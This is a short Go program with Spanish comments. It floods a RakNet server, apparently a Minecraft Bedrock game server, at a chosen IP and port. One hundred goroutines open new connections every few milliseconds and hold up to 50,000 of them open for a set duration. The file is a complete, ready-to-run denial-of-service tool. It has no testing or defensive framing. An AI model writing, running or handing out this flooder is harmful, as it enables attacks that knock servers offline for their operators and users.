package main

import (
    "github.com/sandertv/go-raknet"
    "os"
    "strconv"
    "time"
)

func main() {
    if len(os.Args) < 4 {
        return
    }

    ip := os.Args[1]
    port := os.Args[2]
    duration, _ := strconv.Atoi(os.Args[3])
    
    target := ip + ":" + port
    
    // Timer principal
    stop := time.Now().Add(time.Duration(duration) * time.Second)
    
    // Canal para contar conexiones activas
    activeConns := make(chan *raknet.Conn, 50000)
    
    // Goroutine para crear conexiones
    for i := 0; i < 100; i++ {
        go func() {
            for time.Now().Before(stop) {
                conn, err := raknet.Dial(target)
                if err == nil {
                    select {
                    case activeConns <- conn:
                        // Conexión agregada
                    default:
                        conn.Close() // Buffer lleno
                    }
                }
                time.Sleep(5 * time.Millisecond)
            }
        }()
    }
    
    // Goroutine para mantener conexiones
    go func() {
        for conn := range activeConns {
            go func(c *raknet.Conn) {
                defer c.Close()
                for time.Now().Before(stop) {
                    c.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
                    _, _ = c.ReadPacket()
                    time.Sleep(100 * time.Millisecond)
                }
            }(conn)
        }
    }()
    
    // Esperar el tiempo exacto
    time.Sleep(time.Duration(duration) * time.Second)
    
    // Cerrar canal y forzar terminación
    close(activeConns)
    
    // Pequeña pausa para intentar cerrar conexiones
    time.Sleep(500 * time.Millisecond)
    
    // El proceso termina aquí, Go cerrará todo forzosamente
}
